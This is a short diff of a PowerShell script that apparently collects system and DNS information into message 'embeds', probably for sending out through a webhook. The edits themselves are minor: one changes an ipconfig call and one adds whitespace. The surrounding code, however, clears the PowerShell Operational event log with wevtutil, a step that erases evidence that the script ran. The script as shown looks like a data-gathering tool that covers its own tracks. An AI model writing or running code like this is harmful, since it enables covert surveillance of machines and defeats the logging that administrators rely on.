@@ -186,7 +186,7 @@ if ($connections) { $embeds += @{
 
 
 #Get DNS Data
-$dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
+$dnsData = @(ipconfig | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
 if ($dnsData) { $embeds += @{ 
         title = "DNS Info" 
         description = ($dnsData -join "`n")
@@ -569,6 +569,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
